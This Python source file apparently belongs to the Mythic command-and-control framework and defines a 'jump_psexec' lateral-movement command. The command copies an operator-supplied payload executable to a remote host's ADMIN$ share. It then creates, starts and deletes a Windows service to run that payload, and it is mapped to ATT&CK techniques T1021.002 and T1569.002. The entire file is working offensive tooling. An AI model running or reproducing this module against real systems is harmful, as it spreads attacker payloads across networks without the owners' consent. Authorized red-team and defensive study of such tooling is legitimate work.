from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *
import json
import uuid
import random
import string


class JumpPsexecArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="target",
                cli_name="Target",
                display_name="Target",
                type=ParameterType.String,
                description="Hostname or IP address of the remote target.",
                parameter_group_info=[ParameterGroupInfo(required=True, ui_position=1)],
            ),
            CommandParameter(
                name="payload",
                cli_name="Payload",
                display_name="Payload",
                type=ParameterType.File,
                description="Executable to upload and run on the remote host.",
                parameter_group_info=[ParameterGroupInfo(required=True, ui_position=2)],
            ),
            CommandParameter(
                name="command",
                cli_name="Command",
                display_name="Extra Arguments",
                type=ParameterType.String,
                description="Optional arguments to append to the uploaded binary.",
                default_value="",
                parameter_group_info=[ParameterGroupInfo(required=False, ui_position=3)],
            ),
            CommandParameter(
                name="service_name",
                cli_name="ServiceName",
                display_name="Service Name",
                type=ParameterType.String,
                description="Name of temporary service to create. Leave blank for random UUID.",
                default_value="",
                parameter_group_info=[ParameterGroupInfo(required=False, ui_position=4)],
            ),
        ]

    async def parse_arguments(self):
        raise ValueError("Must use the modal or supply named arguments")

    async def parse_dictionary(self, dictionary_arguments):
        self.load_args_from_dictionary(dictionary_arguments)


async def mirror_up_output(task: PTTaskCompletionFunctionMessage):
    response_search = await SendMythicRPCResponseSearch(
        MythicRPCResponseSearchMessage(TaskID=task.SubtaskData.Task.ID)
    )
    if response_search.Success:
        for r in response_search.Responses:
            await SendMythicRPCResponseCreate(
                MythicRPCResponseCreateMessage(
                    TaskID=task.TaskData.Task.ID,
                    Response=r.Response.encode(),
                )
            )
        await SendMythicRPCResponseCreate(
            MythicRPCResponseCreateMessage(
                TaskID=task.TaskData.Task.ID,
                Response="\n".encode(),
            )
        )


async def psexec_delete_callback(task: PTTaskCompletionFunctionMessage) -> PTTaskCompletionFunctionMessageResponse:
    response = PTTaskCompletionFunctionMessageResponse(Success=True, TaskStatus="success", Completed=True)
    await mirror_up_output(task=task)
    if "error" in task.SubtaskData.Task.Status.lower():
        response.TaskStatus = "error: failed to delete service"
    return response


async def psexec_start_callback(task: PTTaskCompletionFunctionMessage) -> PTTaskCompletionFunctionMessageResponse:
    response = PTTaskCompletionFunctionMessageResponse(Success=True, TaskStatus="success", Completed=True)
    await mirror_up_output(task=task)
    if "error" in task.SubtaskData.Task.Status.lower():
        response.TaskStatus = "error: failed to start service"

    await SendMythicRPCTaskUpdate(
        MythicRPCTaskUpdateMessage(
            TaskID=task.TaskData.Task.ID,
            UpdateStatus="deleting remote service",
        )
    )
    await SendMythicRPCTaskCreateSubtask(
        MythicRPCTaskCreateSubtaskMessage(
            TaskID=task.TaskData.Task.ID,
            SubtaskCallbackFunction="psexec_delete_callback",
            CommandName="sc",
            Params=json.dumps(
                {
                    "computer": task.TaskData.args.get_arg("target"),
                    "delete": True,
                    "service": task.TaskData.args.get_arg("_lm_service_name"),
                }
            ),
        )
    )
    return response


async def psexec_callback(task: PTTaskCompletionFunctionMessage) -> PTTaskCompletionFunctionMessageResponse:
    response = PTTaskCompletionFunctionMessageResponse(Success=True, TaskStatus="success", Completed=True)
    await mirror_up_output(task=task)
    if "error" in task.SubtaskData.Task.Status.lower():
        response.TaskStatus = "error: failed to create service"
        return response

    await SendMythicRPCTaskUpdate(
        MythicRPCTaskUpdateMessage(
            TaskID=task.TaskData.Task.ID,
            UpdateStatus="starting remote service",
        )
    )
    await SendMythicRPCTaskCreateSubtask(
        MythicRPCTaskCreateSubtaskMessage(
            TaskID=task.TaskData.Task.ID,
            SubtaskCallbackFunction="psexec_start_callback",
            CommandName="sc",
            Params=json.dumps(
                {
                    "computer": task.TaskData.args.get_arg("target"),
                    "start": True,
                    "service": task.TaskData.args.get_arg("_lm_service_name"),
                }
            ),
        )
    )
    return response


async def upload_callback(task: PTTaskCompletionFunctionMessage) -> PTTaskCompletionFunctionMessageResponse:
    response = PTTaskCompletionFunctionMessageResponse(Success=True)
    await mirror_up_output(task=task)
    if "error" in task.SubtaskData.Task.Status.lower():
        response.TaskStatus = "error: failed to copy over file"
        return response

    await SendMythicRPCTaskUpdate(
        MythicRPCTaskUpdateMessage(
            TaskID=task.TaskData.Task.ID,
            UpdateStatus="creating remote service",
        )
    )
    await SendMythicRPCTaskCreateSubtask(
        MythicRPCTaskCreateSubtaskMessage(
            TaskID=task.TaskData.Task.ID,
            SubtaskCallbackFunction="psexec_callback",
            CommandName="sc",
            Params=json.dumps(
                {
                    "binpath": task.TaskData.args.get_arg("_lm_exec_cmd"),
                    "computer": task.TaskData.args.get_arg("target"),
                    "create": True,
                    "service": task.TaskData.args.get_arg("_lm_service_name"),
                    "display_name": task.TaskData.args.get_arg("_lm_service_name"),
                }
            ),
        )
    )
    return response


class JumpPsexecCommand(CommandBase):
    cmd = "jump_psexec"
    attributes = CommandAttributes(dependencies=["upload", "sc"])
    needs_admin = True
    help_cmd = "jump_psexec -Target <host> -Payload <file>"
    description = "Lateral movement workflow: upload payload, then execute via remote service creation."
    version = 2
    script_only = True
    author = "@Lavender-exe"
    argument_class = JumpPsexecArguments
    attackmapping = ["T1021.002", "T1569.002"]
    completion_functions = {
        "upload_callback": upload_callback,
        "psexec_callback": psexec_callback,
        "psexec_start_callback": psexec_start_callback,
        "psexec_delete_callback": psexec_delete_callback,
    }

    async def create_go_tasking(self, taskData: PTTaskMessageAllData) -> PTTaskCreateTaskingMessageResponse:
        response = PTTaskCreateTaskingMessageResponse(TaskID=taskData.Task.ID, Success=True)

        target = taskData.args.get_arg("target")
        file_id = taskData.args.get_arg("payload")
        extra_args = taskData.args.get_arg("command") or ""

        rand_name = "".join(random.choices(string.ascii_lowercase + string.digits, k=10)) + ".exe"
        remote_unc = f"\\\\{target}\\ADMIN$\\Temp\\{rand_name}"
        exec_cmd = f"C:\\Windows\\Temp\\{rand_name}"
        if extra_args:
            exec_cmd += f" {extra_args}"

        service_name = taskData.args.get_arg("service_name") or str(uuid.uuid4())

        taskData.args.add_arg("_lm_exec_cmd", exec_cmd)
        taskData.args.add_arg("_lm_service_name", service_name)

        response.DisplayParams = f"{target} -> {remote_unc}"
        response.TaskStatus = "uploading file..."

        await SendMythicRPCTaskCreateSubtask(
            MythicRPCTaskCreateSubtaskMessage(
                TaskID=taskData.Task.ID,
                SubtaskCallbackFunction="upload_callback",
                CommandName="upload",
                Params=json.dumps(
                    {
                        "remote_path": remote_unc,
                        "file": file_id,
                    }
                ),
            )
        )

        return response

    async def process_response(self, task: PTTaskMessageAllData, response: any) -> PTTaskProcessResponseMessageResponse:
        return PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
